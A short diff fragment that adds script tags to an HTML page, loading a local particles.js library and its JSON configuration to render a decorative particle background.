+<script src="/assets/js/particles.min.js"></script>
+<script>
+    particlesJS.load('particles-js', '/assets/js/particles.json', function () {
+        console.log('callback - particles.js config loaded');
+    });
+</script>
+
+</body>
